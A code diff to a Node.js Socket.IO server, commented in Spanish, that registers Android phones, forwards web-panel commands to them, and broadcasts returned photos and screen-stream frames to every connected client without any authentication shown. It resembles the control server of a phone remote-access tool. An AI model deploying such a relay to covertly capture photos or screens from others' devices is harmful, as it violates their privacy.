@@ -8,31 +8,38 @@ const io = new Server(server);
 
 app.use(express.static('public'));
 
-// Listas para separar paneles web de celulares
-let connectedDevices = []; // socket.id -> info del celular
-io.on('connection', (socket) => {
-    // Cuando el teléfono se registra
-    socket.on('register_phone', (data) => {
-        socket.deviceName = data.name;
-        socket.deviceIp = data.ip;
+let connectedDevices = [];
 
-        connectedDevices.push({ id: socket.id, name: data.name, ip: data.ip });
-        io.emit('update_devices', connectedDevices); // Actualiza la interfaz web
+io.on('connection', (socket) => {
+    // Registrar teléfono capturando la IP automáticamente del socket
+    socket.on('register_phone', (data) => {
+        socket.deviceName = data.name || "Android Device";
+        socket.deviceIp = socket.handshake.address;
+
+        // Evitar duplicados si reconecta
+        connectedDevices = connectedDevices.filter(dev => dev.id !== socket.id);
+        
+        connectedDevices.push({ 
+            id: socket.id, 
+            name: socket.deviceName, 
+            ip: socket.deviceIp 
+        });
+        
+        io.emit('update_devices', connectedDevices);
     });
 
-    // Cuando se manda la orden desde la web al teléfono
+    // Reenviar comando de la web al teléfono
     socket.on('send_command_to_device', (data) => {
         io.to(data.targetId).emit('command_to_phone', { action: data.action });
     });
 
-    // Cuando el teléfono responde con la foto, la reenvías a la web (o la broadcast)
+    // Reenviar respuesta del teléfono (fotos) a la web
     socket.on('phone_response', (response) => {
         io.emit('phone_response', response);
     });
 
-    // En tu server.js de Node.js
+    // Reenviar streaming de pantalla a la web
     socket.on('screen_frame', (base64Frame) => {
-        // Reenvía el fotograma a todas las interfaces web conectadas
         io.emit('screen_frame', base64Frame);
     });
 
